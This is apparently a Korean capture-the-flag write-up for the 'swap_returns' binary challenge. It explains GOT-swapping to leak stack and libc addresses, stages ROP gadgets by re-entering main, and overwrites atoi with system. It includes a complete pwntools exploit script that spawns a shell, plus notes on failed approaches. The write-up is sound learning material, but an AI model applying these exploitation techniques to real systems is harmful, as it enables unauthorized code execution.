# index

- [summary](#summary)
- [analysis](#analysis)
- [exploit](#exploit)
- [삽질](#삽질)



# summary

- stack leak using "%p"
- utilize stack space using main() address
- fxxk



# analysis

```css
m444ndu@ubuntu:~/round1/swap_returns$ checksec swap_returns 
[*] '/home/m444ndu/round1/swap_returns/swap_returns'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



### main()

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int index; // eax
  __int64 *A; // [rsp+10h] [rbp-20h]
  __int64 *B; // [rsp+18h] [rbp-18h]
  __int64 tmp; // [rsp+20h] [rbp-10h]
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  initialize();
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      index = read_int();
      if ( index != 2 )
        break;
      tmp = *A;                                 // swap
      *A = *B;
      *B = tmp;
      tmp = 0LL;
    }
    if ( index == 3 )
    {
      printf("Bye. ", argv);
      _exit(0);
    }
    if ( index == 1 )                           // set
    {
      puts("1st address: ");
      __isoc99_fscanf(stdin, "%lu", &A);
      puts("2nd address: ");
      argv = (const char **)"%lu";
      __isoc99_fscanf(stdin, "%lu", &B);
    }
    else
    {
      printf("Invalid choice. ", argv);
    }
  }
}
```

구조는 리얼쓰 간단합니당. 그냥 십진수로 주소 값을 입력 받아, 해당 주소에 있는 값들을 스와핑해줍니다. 



### read_int()

```c
__int64 read_int()
{
  __int16 buf; // [rsp+6h] [rbp-Ah]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  read(0, &buf, 2uLL);
  return (unsigned int)atoi((const char *)&buf);
}
```

`read()`로 2bytes만큼 입력받고, `atoi()`를 이용하여 리턴해줍니다.

이 문제를 보고 바로 든 생각은 `atoi@got`를 `system` 함수 주소로 덮으면 되겠구나 였습니다. 다행히 예상과 다르지않게 문제를 풀 수 있었지만 이렇게 험난할 줄은... 



일단 값들을 바꿔주려면 주소가 필요하기 때문에, 맨 처음 할 수 있는 짓은 함수들의 `got`들을 서로 바꿔주어 사용할 수 있는 주소 값, `libc`나 `stack`의 주소를 **leak** 할 수 있는 방법을 찾아보았습니당

만만한게 `atoi()`인데 예상과 다르지 않게 바로 `printf()`와 서로 `got`를 바꿔주면 "%p"를 통해 `buf`의 주소 값을 알아낼 수 있습니다. 이제 스택 영역을 정복하였습니다. ^_^

> 여기서 주의할 점은 `printf()`의 `got`가 초기 `printf@plt+6`을 가리킬 때 바꾼다면 `atoi()`의 탈을 쓴 `printf()`가 실행되면서 `libc`안의 주소를 찾아 `printf@got`에 덮어쓰게 됩니다. 덮어쓰는 과정에서 기존에 존재하던 `atoi@got`는 날아가기 때문에, `printf()"Invalid choice. ")`를 한 번 실행시키고 바꿔주는게 신상에 이로울 것입니더.



암튼 이제 다음과정은 스택에 원하는 값을 담는 일입니다. 그러나 입력하는 과정같은 경우 주소 값으로 사용되기 때문에 조심스럽군여.

사실 처음에는 그냥 스택에 남은 다른 **libc** 주소 값들을 사용해서 뒷자리만 `system`함수의 `offset`으로 맞춰주는 것도 생각해봤는데, `system`함수의 **libc**와 마지막 두 바이트를 제외한 주소조차 일치하는게 없어서 무리라고 생각했습니다... 그래서 어떻게든 스택 공간에 원하는 값을 쓸 수 있는 공간을 확보하려 애를 썻는데, 제가 한 시도는 두 가지정도 됨다!

#### 뇌피셜

1. `exit()@got`를 `read()@plt`로 덮기. 실제로 디버깅해서 살펴보니 `exit(0)`이 불리기 직전에 `rdi`는 **0**을 나타내고, `rsi`는 `main_rbp-9920`을 나타내며, `rdx`는 **libc**를 가리켰습니다. `exit()`대신에 `read()`가 실행된다면 이제 해당 스택공간은 제꺼가 되는 거지오! 심지어 **bof**가 발생시킬 수 있습니다....아니 있을 거라 생각했슴다... 근데 이상하게 안됩니다.. 머가 문제지... 또륵..ㅠ
2. `exit()@got`를 `main()`시작 주소로 덮기. `exit()`시마다 `main()`을 새로 실행시켜 이전 `main()` 공간 중 `Set()`하는 0x10바이트 공간을 제가 원하는 값을 올려놓고 사용할 수 있습니다! 요 방법으로 계속 밀고 나가겠습니다!

<br/>

크 `main()`문을 계속 부르면서 할당받을 수 있는 0x10 바이트 공간들에 `gadget`으로 사용할 값들을 계속 저장하며 진행합니다. 찾아보니 다행히 `leave; ret;`가 존재하여 `rip`를 **ROP chain**으로 덮고, `exit()`를 `leave; ret;`로 바꿔준다면 해당 **chain**을 실행시킬 수 있습니다. 



요약하자면, 처음에는 공간을 할당하여 `pop rdi; ret;`, `leave; ret;`, `0x4008e9(start_main)`, `puts@plt`, `puts@got`등의  값들을 저장한 뒤, `puts(puts@got)`가 실행되도록 가장 최근 `main()_chunk`의 `rip`부터 **ROP chain**을 만들어준 뒤, `exit()`를 `leave; ret;`로 바꾸어 해당 **ROP chain**를 실행합니다.

여기서 **libc leak**을 할 수가 있고, 이제 `atoi()`함수의 `got`를 알아낸 `system` 주소로 덮습니다. 다시 `exit()`를 `start_main` 으로 바꿔줘서 공간을 할당해준 뒤 사용할 수 있습니다. 그리하야 `system("sh")`를 실행시키면 익스가 가능합니당. `atoi@got`를 `system`으로 덮는 대신 그냥 아까처럼 `rip`를 **ROP chain**으로 덮어도 됩니다.



# exploit

```python
#! /usr/bin/python
from pwn import *

def Set(addr1, addr2):
	r.sendlineafter('Your choice: \n', '1')
	r.sendlineafter('1st address: \n', str(addr1))
	r.sendlineafter('2nd address: \n', str(addr2))


r = process('./swap_returns', env={'LD_PRELOAD':'./libc.so.6'})
#context.log_level = 'debug'
#gdb.attach(r,'b* 0x0000040090A')
libc = ELF('./libc.so.6')

printf_addr = 0x601038
atoi_addr = 0x601050
Set(printf_addr, atoi_addr)

r.sendlineafter('Your choice: \n', '5')
r.sendlineafter('Your choice: \n', '2') # swap
r.sendlineafter('Your choice: \n', '%p')

leak = r.recvuntil('1. Set')
leak = int(leak[:leak.find('1. Set')],16)
success('stack leak = '+hex(leak))
rbp = leak+74
A_addr = rbp-0x20
B_addr = rbp-0x18
log.info('main rbp address = '+hex(rbp))
log.info('stack A address = '+hex(A_addr))
log.info('stack B address = '+hex(B_addr))


r.sendlineafter('1st address: \n', str(printf_addr))
r.sendlineafter('2nd address: \n', str(atoi_addr))
r.sendlineafter('Your choice: \n', '2') # swap


''' find main address in stack
pwndbg> search -x e90840
swap_returns    0x400720 jmp    0xffffffffff40472d
swap_returns    0x600720 0x8c615ff004008e9
warning: Unable to access 16000 bytes of target memory at 0x7f2a34c76d02, halting search.
[stack]         0x7ffce0ccae08 0x4008e9
'''
exit_addr = 0x601018
stack_main_addr = rbp+40
Set(exit_addr, stack_main_addr) # exit() -> return main()
r.sendlineafter('Your choice: \n', '2') # swap


'''
0x00000000004008e7 : leave ; ret
0x0000000000400a53 : pop rdi ; ret
'''

#### save gadget in stack ####
start_main = 0x4008e9 # rbp-0x20
leaveret = 0x0004008e7 # rbp-0x18
Set(start_main, leaveret)
r.sendlineafter('Your choice: \n', '3') # return main()


popret = 0x000400a53  # rbp-0x60
leaveret = 0x0004008e7 # rbp-0x58
Set(popret, leaveret) # save gadget in stack 
r.sendlineafter('Your choice: \n', '3') # return main()


puts_plt = 0x004006A0 # rbp-0xa0
puts_got = 0x601028 # rbp-0x98
Set(puts_plt, puts_got)
r.sendlineafter('Your choice: \n', '3') # return main()



#### save 0x4008e9 in bss ####
bss_addr = 0x601d00
Set(exit_addr, bss_addr)
r.sendlineafter('Your choice: \n', '2') # swap


#### pop ret; puts@got.plt; puts@plt; main(); ####
chunk1_rip = rbp-0xb8
Set(chunk1_rip, rbp-0x60) # pop ret;
r.sendlineafter('Your choice: \n', '2') # swap

Set(chunk1_rip+0x8, rbp-0x98) # puts@got
r.sendlineafter('Your choice: \n', '2') # swap

Set(chunk1_rip+0x10, rbp-0xa0) # puts@plt
r.sendlineafter('Your choice: \n', '2') # swap

Set(chunk1_rip+0x18, bss_addr) # start_main
r.sendlineafter('Your choice: \n', '2') # swap


#### exit() -> leave; ret; ####
Set(rbp-0x58, exit_addr) # leave; ret;
r.sendlineafter('Your choice: \n', '2') # swap


#### leak libc ####
r.sendlineafter('Your choice: \n', '3') # call rop chain1
r.recvuntil('Bye. ')
leak = u64(r.recv(6).ljust(8,'\x00'))
success('libc leak = '+hex(leak))
libc_base = leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
#binsh_addr = libc_base + next(libc.search('/bin/sh'))
log.info('libc_base = '+hex(libc_base))
log.info('system_addr = '+hex(system_addr))


#### save system_addr in stack ####
Set(exit_addr, rbp-0x20) # start_main = 0x4008e9 # rbp-0x20
r.sendlineafter('Your choice: \n', '2') # swap

Set(system_addr, 0xaaaaaa) # rbp-0xc0, rbp-0xb8
r.sendlineafter('Your choice: \n', '3') # return main()


#### atoi() -> system() ####
Set(rbp-0xc0, atoi_addr)
r.sendlineafter('Your choice: \n', '2') # swap

r.sendlineafter('Your choice: \n', 'sh') # system("sh")
r.interactive()

'''
.got.plt:0x601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0x601008 qword_601008    dq 0                    
.got.plt:0x601010 ; __int64 (*qword_601010)(void)
.got.plt:0x601010 qword_601010    dq 0                    
.got.plt:0x601018 off_601018      dq offset _exit         
6295576
.got.plt:0x601020 off_601020      dq offset __isoc99_fscanf
.got.plt:0x601020                                         
6295584
.got.plt:0x601028 off_601028      dq offset puts          
6295592
.got.plt:0x601030 off_601030      dq offset __stack_chk_fail
.got.plt:0x601030                                         
.got.plt:0x601038 off_601038      dq offset printf        
6295608
.got.plt:0x601040 off_601040      dq offset read          
6295616
.got.plt:0x601048 off_601048      dq offset setvbuf       
.got.plt:0x601050 off_601050      dq offset atoi          
6295632
'''
```



## 삽질

1. 초반에 `stdin`이 **libc pointer**인줄 알고 ㅋㅋㅋ `fscanf`를 `printf`랑 바꿔서 **libc leak**하려고 했다. 실은 그냥 **libc** 값을 가진 변수엿음 ㅋㅋㅋ 그래도 저거를 어떻게 사용할 수 있을까싶어 짱구를 굴려봣는데 더 굴려야할듯

   ```c
         puts("1st address: ");
         __isoc99_fscanf(stdin, "%lu", &A);
         puts("2nd address: ");
         argv = (const char **)"%lu";
         __isoc99_fscanf(stdin, "%lu", &B);
   ```

2. 위에서 언급했던 `exit`를 `read`로 바꾸기. 솔직히 아직까지도 왜 안되는지 몰겟당. 크흠.. 사실 이 바이너리의 익스 시나리오는 여기서부터 세웠었는데...ㅜ

   ```c
         printf("Bye. ", argv);
         _exit(0);
   ```

3. 첨에는 **%p**가 생각이 안나서 **format string bug**로 릭하는 줄 ㅋㅋㅋ

   ```c
     read(0, &buf, 2uLL);
     return (unsigned int)atoi((const char *)&buf);
   ```


##### [+] 새로운 leak 방법

 `stderr` 값을 `got`로 바꾸고 `setvbuf`를 `printf`로 바꾼다면, 새`main()` 으로 뛸 때, `got`를 릭할 수 있음!
